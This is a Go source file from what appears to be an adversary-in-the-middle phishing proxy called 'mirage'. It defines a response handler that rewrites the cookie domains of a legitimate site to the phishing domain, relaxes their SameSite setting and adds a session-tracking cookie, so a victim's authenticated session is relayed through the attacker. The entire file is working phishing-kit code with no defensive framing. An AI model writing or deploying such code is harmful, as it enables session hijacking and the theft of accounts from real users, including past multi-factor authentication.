package response

import (
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// CookieRewriter rewrites upstream Set-Cookie domains to the phishing domain
// and injects the session tracking cookie on the first response.
type CookieRewriter struct{}

func (h *CookieRewriter) Name() string { return "CookieRewriter" }

func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	cookies := resp.Cookies()
	resp.Header.Del("Set-Cookie")

	for _, cookie := range cookies {
		if ctx.Phishlet != nil && ctx.Deployment != nil && cookie.Domain != "" {
			cookie.Domain = rewriteCookieDomain(cookie.Domain, ctx.Phishlet, ctx.Deployment)
		}
		cookie.Secure = true
		cookie.SameSite = http.SameSiteNoneMode
		resp.Header.Add("Set-Cookie", cookie.String())
	}

	if ctx.IsNewSession && ctx.Session != nil {
		tracker := &http.Cookie{
			Name:     "__ss",
			Value:    ctx.Session.ID,
			Path:     "/",
			HttpOnly: true,
			Secure:   true,
			SameSite: http.SameSiteNoneMode,
		}
		resp.Header.Add("Set-Cookie", tracker.String())
	}
	return nil
}

func rewriteCookieDomain(upstreamDomain string, def *aitm.PhishletDef, deployment *aitm.PhishletDeployment) string {
	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
	for _, proxyHost := range def.ProxyHosts {
		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
			return proxyHost.PhishSubdomain + "." + deployment.BaseDomain
		}
	}
	return upstreamDomain
}

var _ proxy.ResponseHandler = (*CookieRewriter)(nil)
